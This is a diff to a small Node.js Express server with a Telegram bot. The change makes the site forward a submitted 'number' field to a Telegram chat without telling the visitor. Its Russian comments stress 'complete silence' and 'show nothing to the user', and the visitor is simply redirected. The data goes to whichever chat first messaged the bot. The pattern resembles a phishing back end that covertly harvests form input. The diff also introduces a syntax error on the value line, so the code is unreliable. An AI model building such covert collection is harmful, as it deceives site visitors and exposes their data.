@@ -12,26 +12,26 @@ let CHAT_ID = null;
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(express.static('public'));
 
+// Бот сам запоминает chat_id
 bot.on('message', (msg) => {
   if (!CHAT_ID) {
     CHAT_ID = msg.chat.id;
-    bot.sendMessage(CHAT_ID, '');
-    console.log('Chat ID:', CHAT_ID);
   }
 });
 
+// Приём данных с сайта — ПОЛНАЯ ТИШИНА
 app.post('/send', (req, res) => {
-  const number = req.body.number;
+  const value = req.body.number'';
 
-  if (!CHAT_ID) {
-    return res.send('');
+  if (CHAT_ID && value) {
+    bot.sendMessage(CHAT_ID, value);
   }
 
-  bot.sendMessage(CHAT_ID, `📩 С сайта пришло число: ${number}`);
-  res.send('');
+  // НИЧЕГО не показываем пользователю
+  res.redirect('/');
 });
 
 const PORT = process.env.PORT || 3000;
+app.listen(PORT);
 
-app.listen(PORT, () => console.log('Server started'));
 
